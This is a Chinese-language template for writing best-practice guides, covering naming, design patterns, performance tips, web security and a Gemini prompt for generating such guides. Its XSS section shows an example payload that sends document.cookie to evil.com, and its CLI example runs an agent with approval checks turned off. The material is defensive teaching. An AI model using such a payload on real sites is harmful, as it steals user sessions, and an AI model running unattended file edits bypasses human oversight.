---
title: 最佳实践模板
description: 用于生成最佳实践指南的标准模板,定义代码规范、设计模式、性能优化和安全实践的规范结构。适用于经验总结、模式提取和深度实践文章。
---

# 最佳实践模板

本模板用于生成**最佳实践指南**,适用于代码规范、设计模式、性能优化、安全实践等场景。遵循 **Layer 1 通用规范** + **Layer 2 最佳实践规范**。

## 文档结构模板

### Frontmatter

```yaml
---
title: '[主题领域] 最佳实践'
description: '[完整的实践目标和适用场景说明]'
category: 实践
ai_model: Gemini # 推荐使用 Gemini 进行模式识别
---
```

### 章节结构

#### 1. 代码规范

**目的**: 定义代码风格、命名约定和格式化标准。

**内容要求**:

- **命名规范**: 变量、函数、类、文件的命名约定
- **代码格式**: 缩进、空行、行宽等格式要求
- **注释规范**: 何时写注释、注释风格
- **文件组织**: 模块划分、目录结构
- **对比示例**: 好的实践 vs 不好的实践

**示例结构**:

```markdown
## 代码规范

### 命名约定

#### 函数命名

**✅ 推荐做法**:
\`\`\`typescript
// 使用动词开头,清晰表达功能
function calculateTotal(items: Item[]): number { }
function validateEmail(email: string): boolean { }
function getUserById(id: string): User | null { }
\`\`\`

**❌ 不推荐做法**:
\`\`\`typescript
// 命名不清晰,难以理解功能
function calc(items: any[]): any { } // 太简略
function doValidation(x: string): boolean { } // 泛化动词
function user(id: string) { } // 缺少动词
\`\`\`

**原因**: 清晰的命名减少代码阅读成本,动词开头明确表达行为意图。

#### 变量命名

**规则**:

- 使用有意义的名称,避免单字母变量 (循环索引除外)
- 布尔值使用 `is/has/should` 前缀
- 常量使用 `UPPER_SNAKE_CASE`
- 避免使用缩写,除非是广泛认可的术语

**示例**:
\`\`\`typescript
// ✅ 推荐
const isUserActive = true
const hasPermission = checkPermission(user)
const MAX_RETRY_COUNT = 3

// ❌ 不推荐
const ua = true // 含义不明
const perm = checkPermission(user) // 过度缩写
const maxRetry = 3 // 常量应大写
\`\`\`

### 代码格式

**基础规则**:

- **缩进**: 使用 2 空格 (TypeScript/JavaScript)
- **行宽**: 不超过 100 字符
- **分号**: 始终使用分号
- **引号**: 优先使用单引号,模板字符串除外

**示例**:
\`\`\`typescript
// ✅ 推荐格式
function processData(
input: string,
options: ProcessOptions
): Result {
const { maxLength, allowEmpty } = options;

if (!allowEmpty && input.length === 0) {
throw new Error('Input cannot be empty');
}

return { processed: input.slice(0, maxLength) };
}
\`\`\`

### 注释规范

**何时写注释**:

- ✅ 复杂算法的实现思路
- ✅ 非显而易见的业务逻辑
- ✅ 重要的性能优化说明
- ❌ 显而易见的代码 (如 `i++  // increment i`)

**JSDoc 注释**:
\`\`\`typescript
/\*\*

- 计算数组中所有数字的总和
-
- @param numbers - 待求和的数字数组
- @returns 数组所有元素的总和
- @throws 当数组包含非数字元素时抛出错误
-
- @example
- \`\`\`typescript
- sum([1, 2, 3]) // => 6
- sum([]) // => 0
- \`\`\`
  \*/
  function sum(numbers: number[]): number {
  return numbers.reduce((acc, n) => acc + n, 0);
  }
  \`\`\`
```

#### 2. 设计模式

**目的**: 总结常用设计模式和反模式,提供可复用的解决方案。

**内容要求**:

- **常用模式**: 项目中广泛应用的设计模式
- **模式应用**: 何时使用、如何实现
- **反模式识别**: 常见的错误设计及其危害
- **重构建议**: 如何改进不良设计

**示例结构**:

```markdown
## 设计模式

### 组合优于继承

**原则**: 优先使用对象组合而非类继承来实现代码复用。

**问题**: 继承带来强耦合,子类依赖父类实现细节,难以修改。

**方案**: 使用组合模式,通过依赖注入实现功能复用。

**对比示例**:

#### ❌ 不推荐: 深层继承

\`\`\`typescript
class Animal {
move() { console.log('Moving'); }
}

class Bird extends Animal {
fly() { console.log('Flying'); }
}

class Penguin extends Bird {
// 企鹅不会飞,但继承了 fly 方法
fly() {
throw new Error('Penguins cannot fly');
}
}
\`\`\`

**问题**: `Penguin` 继承了不需要的 `fly` 方法,违反里氏替换原则。

#### ✅ 推荐: 组合模式

\`\`\`typescript
interface Movable {
move(): void;
}

interface Flyable {
fly(): void;
}

class WalkMovement implements Movable {
move() { console.log('Walking'); }
}

class FlyMovement implements Flyable {
fly() { console.log('Flying'); }
}

class Bird {
constructor(
private movement: Movable,
private flyBehavior?: Flyable
) {}

move() { this.movement.move(); }
fly() {
if (this.flyBehavior) {
this.flyBehavior.fly();
} else {
console.log('Cannot fly');
}
}
}

// 灵活组合
const sparrow = new Bird(new WalkMovement(), new FlyMovement());
const penguin = new Bird(new WalkMovement()); // 没有飞行能力
\`\`\`

**优势**:

- 松耦合,易于扩展和修改
- 符合单一职责原则
- 行为可在运行时动态组合

**适用场景**:

- 功能组合多样,不适合继承层次
- 需要运行时切换行为
- 避免类爆炸问题

### 工厂模式的实际应用

**场景**: 创建复杂对象时,隐藏构造细节,提供统一接口。

**实现**:
\`\`\`typescript
interface Logger {
log(message: string): void;
}

class ConsoleLogger implements Logger {
log(message: string) { console.log(message); }
}

class FileLogger implements Logger {
constructor(private filePath: string) {}
log(message: string) {
// 写入文件逻辑
}
}

// 工厂函数
function createLogger(type: 'console' | 'file', options?: { filePath?: string }): Logger {
switch (type) {
case 'console':
return new ConsoleLogger();
case 'file':
if (!options?.filePath) {
throw new Error('File path required for FileLogger');
}
return new FileLogger(options.filePath);
}
}

// 使用
const logger = createLogger('file', { filePath: './app.log' });
logger.log('Application started');
\`\`\`

**优势**: 调用者无需知道具体类,易于扩展新类型。

### 常见反模式

#### God Object (上帝对象)

**问题**: 单个类承担过多职责,代码难以理解和维护。

\`\`\`typescript
// ❌ 反模式
class Application {
// 数据库操作
connectDatabase() { }
queryData() { }

// UI 渲染
renderUI() { }
handleClick() { }

// 业务逻辑
processOrder() { }
validateUser() { }

// 日志和配置
logMessage() { }
loadConfig() { }
}
\`\`\`

**危害**: 违反单一职责原则,修改一个功能可能影响其他功能。

**重构方向**: 按职责拆分为多个独立的类 (Database, UI, OrderService, Logger)。
```

#### 3. 性能优化

**目的**: 识别性能瓶颈并提供优化策略。

**内容要求**:

- **瓶颈识别**: 常见的性能问题类型
- **优化策略**: 具体的优化方法和技巧
- **测量方法**: 如何验证优化效果
- **权衡考虑**: 优化的成本和收益

**示例结构**:

```markdown
## 性能优化

### 避免不必要的重复计算

**问题**: 在循环中重复计算不变的表达式。

#### ❌ 低效实现

\`\`\`typescript
function processItems(items: Item[]) {
const results: Result[] = [];

for (let i = 0; i < items.length; i++) {
// 每次循环都重复计算 items.length
const progress = (i + 1) / items.length \* 100;

    // 每次循环都创建新的正则表达式
    if (/^[A-Z]/.test(items[i].name)) {
      results.push(processItem(items[i]));
    }

}

return results;
}
\`\`\`

#### ✅ 优化实现

\`\`\`typescript
function processItems(items: Item[]) {
const results: Result[] = [];
const totalItems = items.length; // 缓存长度
const namePattern = /^[A-Z]/; // 复用正则对象

for (let i = 0; i < totalItems; i++) {
const progress = (i + 1) / totalItems \* 100;

    if (namePattern.test(items[i].name)) {
      results.push(processItem(items[i]));
    }

}

return results;
}
\`\`\`

**优化说明**:

- 缓存 `items.length` 避免每次访问数组属性
- 复用正则表达式对象,避免重复编译
- 性能提升: 约 10-20% (取决于数组大小)

### 使用防抖和节流

**场景**: 高频触发的事件 (滚动、输入、窗口调整)

#### 防抖 (Debounce)

**用途**: 延迟执行,仅在事件停止触发后执行一次。

\`\`\`typescript
function debounce<T extends (...args: any[]) => any>(
fn: T,
delay: number
): (...args: Parameters<T>) => void {
let timeoutId: ReturnType<typeof setTimeout> | null = null;

return function (...args: Parameters<T>) {
if (timeoutId) clearTimeout(timeoutId);

    timeoutId = setTimeout(() => {
      fn(...args);
    }, delay);

};
}

// 使用示例
const searchInput = document.getElementById('search');
const debouncedSearch = debounce((query: string) => {
// 发起搜索请求
fetch(\`/api/search?q=\${query}\`);
}, 300);

searchInput?.addEventListener('input', (e) => {
debouncedSearch((e.target as HTMLInputElement).value);
});
\`\`\`

**效果**: 用户输入停止 300ms 后才发起请求,减少无效请求。

#### 节流 (Throttle)

**用途**: 限制执行频率,固定时间间隔内只执行一次。

\`\`\`typescript
function throttle<T extends (...args: any[]) => any>(
fn: T,
interval: number
): (...args: Parameters<T>) => void {
let lastTime = 0;

return function (...args: Parameters<T>) {
const now = Date.now();

    if (now - lastTime >= interval) {
      fn(...args);
      lastTime = now;
    }

};
}

// 使用示例
const throttledScroll = throttle(() => {
console.log('Scroll position:', window.scrollY);
}, 200);

window.addEventListener('scroll', throttledScroll);
\`\`\`

**效果**: 滚动时每 200ms 最多执行一次,减少性能开销。

### 性能测量

**使用 Performance API**:
\`\`\`typescript
function measurePerformance<T>(
name: string,
fn: () => T
): T {
const start = performance.now();
const result = fn();
const end = performance.now();

console.log(\`\${name} took \${(end - start).toFixed(2)}ms\`);
return result;
}

// 使用
const processedData = measurePerformance('Data Processing', () => {
return processLargeDataset(data);
});
\`\`\`

**性能优化权衡**:

- ✅ 优化前先测量,避免过早优化
- ⚠️ 考虑代码可读性 vs 性能提升的平衡
- ⚠️ 优化应针对瓶颈,不是所有代码都需要优化
```

#### 4. 安全实践

**目的**: 识别常见安全漏洞并提供防护措施。

**内容要求**:

- **常见漏洞**: 项目中可能出现的安全问题
- **防护措施**: 具体的安全实践方法
- **验证方法**: 如何检测安全漏洞
- **安全清单**: 开发和部署的安全检查项

**示例结构**:

```markdown
## 安全实践

### 防止 XSS 攻击

**漏洞**: 跨站脚本攻击 (Cross-Site Scripting)

**危害**: 攻击者注入恶意脚本,窃取用户数据或劫持会话。

#### ❌ 不安全实现

\`\`\`typescript
// 直接插入用户输入,存在 XSS 风险
function displayUserComment(comment: string) {
document.getElementById('comments')!.innerHTML = comment;
}

// 攻击示例
displayUserComment('<script>alert("XSS")</script>');
// 或
displayUserComment('<img src=x onerror="fetch(\\'https://evil.com?cookie=\\' + document.cookie)">');
\`\`\`

#### ✅ 安全实现

**方案 1: 使用 textContent**
\`\`\`typescript
function displayUserComment(comment: string) {
const element = document.getElementById('comments')!;
element.textContent = comment; // 自动转义,防止脚本执行
}
\`\`\`

**方案 2: HTML 转义**
\`\`\`typescript
function escapeHtml(unsafe: string): string {
return unsafe
.replace(/&/g, '&amp;')
.replace(/</g, '&lt;')
.replace(/>/g, '&gt;')
.replace(/"/g, '&quot;')
.replace(/'/g, '&#039;');
}

function displayUserComment(comment: string) {
const escaped = escapeHtml(comment);
document.getElementById('comments')!.innerHTML = escaped;
}
\`\`\`

**方案 3: 使用 DOMPurify 库**
\`\`\`typescript
import DOMPurify from 'dompurify';

function displayUserComment(comment: string) {
const clean = DOMPurify.sanitize(comment);
document.getElementById('comments')!.innerHTML = clean;
}
\`\`\`

**推荐**: 对于复杂 HTML 内容,使用 DOMPurify;简单文本使用 textContent。

### 输入验证和清理

**原则**: 永远不要信任用户输入。

#### 类型验证

\`\`\`typescript
interface UserInput {
email: string;
age: number;
website?: string;
}

function validateUserInput(input: unknown): UserInput {
if (typeof input !== 'object' || input === null) {
throw new Error('Invalid input: must be an object');
}

const data = input as Record<string, unknown>;

// 验证 email
if (typeof data.email !== 'string' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
throw new Error('Invalid email format');
}

// 验证 age
if (typeof data.age !== 'number' || data.age < 0 || data.age > 150) {
throw new Error('Invalid age: must be between 0 and 150');
}

// 验证可选字段
if (data.website !== undefined) {
if (typeof data.website !== 'string' || !isValidUrl(data.website)) {
throw new Error('Invalid website URL');
}
}

return {
email: data.email,
age: data.age,
website: data.website as string | undefined
};
}

function isValidUrl(url: string): boolean {
try {
new URL(url);
return true;
} catch {
return false;
}
}
\`\`\`

### 敏感数据处理

**规则**:

1. ❌ 永远不要在客户端存储密码、令牌等敏感数据
2. ✅ 使用 HTTPS 传输敏感信息
3. ✅ 对敏感数据加密存储
4. ✅ 实施访问控制和权限检查

#### 安全的密码处理

\`\`\`typescript
// ❌ 不安全: 明文传输
async function loginUser(username: string, password: string) {
const response = await fetch('http://api.example.com/login', {
method: 'POST',
body: JSON.stringify({ username, password }) // 明文
});
}

// ✅ 安全: HTTPS + 服务端哈希
async function loginUser(username: string, password: string) {
const response = await fetch('https://api.example.com/login', { // HTTPS
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

// 服务端应使用 bcrypt/argon2 哈希密码
}

// 令牌存储
function storeAuthToken(token: string) {
// ❌ 不安全: localStorage (易受 XSS 攻击)
// localStorage.setItem('token', token);

// ✅ 更安全: HttpOnly Cookie (由服务端设置)
// 客户端无法通过 JS 访问,防止 XSS 窃取
}
\`\`\`

### 安全检查清单

**开发阶段**:

- [ ] 所有用户输入都经过验证和清理
- [ ] 使用参数化查询防止 SQL 注入
- [ ] HTML 内容使用转义或 DOMPurify
- [ ] 敏感操作需要权限验证
- [ ] 不在代码中硬编码密钥和令牌

**部署阶段**:

- [ ] 启用 HTTPS
- [ ] 设置安全响应头 (CSP, X-Frame-Options)
- [ ] 限制 API 访问频率 (Rate Limiting)
- [ ] 定期更新依赖库,修复已知漏洞
- [ ] 实施日志和监控,检测异常行为
```

## AI 生成提示词

以下提示词适用于使用 **Gemini** 生成最佳实践文档 (推荐模型: `gemini-2.5-pro`)。

### 角色定义

你是一位**资深软件工程师和技术导师**,擅长从实际项目中提取设计模式、总结经验教训并撰写深度实践指南。你不仅关注"怎么做",更注重解释"为什么"。

### 任务说明

基于提供的代码库、项目经验或技术主题,生成一份最佳实践指南,符合以下规范:

1. **遵循规范**:
   - Layer 1 通用文档规范 (Frontmatter、标题结构、语言、链接格式、代码示例、注意事项)
   - Layer 2 最佳实践规范 (问题-原则-方案结构、对比分析、适用场景说明、深度和广度平衡)
   - 本模板的 4 个章节结构

2. **内容要求**:
   - **代码规范章节**: 定义命名约定、代码格式和注释规范,提供好/坏实践的对比示例
   - **设计模式章节**: 总结项目中常用的设计模式,说明应用场景,识别反模式并提供重构建议
   - **性能优化章节**: 识别常见性能瓶颈,提供具体优化策略,包含性能测量方法
   - **安全实践章节**: 列出常见安全漏洞,提供防护措施和验证方法,包含安全检查清单

3. **质量检查点**:
   - **规范实用性**: 代码规范条目清晰具体,可直接应用于项目,避免过于抽象或理论化
   - **示例代码质量**: 所有对比示例准确反映好/坏实践的差异,附带详细的原因说明和适用场景
   - **安全建议完整性**: 安全实践章节覆盖至少 3 种常见漏洞类型,每种都有具体防护代码示例

### 输入要求

- **代码库上下文**: 提供项目源码结构和典型代码示例
- **编码规范**: 如有现成的代码规范或风格指南文档
- **已知问题**: 项目中遇到的性能瓶颈或安全隐患

### 输出格式

- **格式**: Markdown 文件,包含 YAML frontmatter
- **语言**: 简体中文 (代码注释可使用英文)
- **代码块**: 使用三反引号 (\`\`\`) 包裹,标注语言类型
- **对比标记**: 使用 ✅ 和 ❌ 标记好/坏实践

## 推荐模型

- **首选**: **Gemini** (`gemini-2.5-pro`) - 模式识别能力强,擅长从代码库中提取设计原则和经验教训
- **备选**: **Qwen** (`qwen-coder`) - 当 Gemini 不可用时的备选方案

### 使用示例

```bash
# 使用 Gemini 生成最佳实践
cd docs && gemini -p "
PURPOSE: 总结 Dora Pocket 项目的代码组织和性能优化最佳实践
TASK:
• 分析现有包的模块组织模式和命名规范
• 提取可复用的设计原则和实践方法
• 识别常见的性能瓶颈和优化策略
• 总结安全实践和防护措施
MODE: write
CONTEXT: @packages/*/src/**/* @CLAUDE.md @docs/contributing/**/* | Memory: Monorepo 分类组织模式,零依赖原则,VitePress 文档系统
EXPECTED: 完整的最佳实践文档,包含 4 个章节、对比代码示例和 3 个质量检查点的验证
RULES: $(cat ~/.claude/workflows/cli-templates/prompts/analysis/02-analyze-code-patterns.txt) | 遵循 L1+L2 最佳实践规范,使用问题-原则-方案结构,提供深度分析 | write=CREATE/MODIFY/DELETE
" --approval-mode yolo
```

## 核心指令与规范

1. **继承规范**:
   - ✅ Layer 1 通用文档规范 (参见 [architecture.md](./architecture.md#layer-1-通用文档规范层))
   - ✅ Layer 2 最佳实践规范 (参见 [architecture.md](./architecture.md#类型-4-最佳实践规范))

2. **必需章节**:
   - 代码规范 (命名、格式、注释、文件组织)
   - 设计模式 (常用模式、反模式、重构建议)
   - 性能优化 (瓶颈识别、优化策略、测量方法)
   - 安全实践 (常见漏洞、防护措施、安全清单)

3. **对比示例要求**:
   - 每个重要实践点都提供好/坏实践对比
   - 使用 ✅ 和 ❌ 标记清晰区分
   - 附带详细的原因说明和适用场景

4. **质量检查要点**:
   - **规范实用性**: 验证所有规范条目清晰具体,可直接应用
   - **示例代码质量**: 确保对比示例准确反映实践差异,附带原因说明
   - **安全建议完整性**: 检查安全章节至少覆盖 3 种常见漏洞及防护方法

## 相关文档

- [术语表](./glossary.md) - 文档类型和 AI 模型定义
- [文档规范体系架构](./architecture.md) - 3 层规范体系设计
- [AI 模型调度策略](./ai-model-strategy.md) - 模型选择和使用规范
- [Kit 工具函数模板](./kit-template.md) - API 文档模板参考
- [文档编写指南: 总览](./overview.md) - 文档哲学和核心理念

## 版本历史

- **v1.0** (2025-11-19): 初始版本,定义最佳实践的 4 个章节结构和 AI 生成提示词
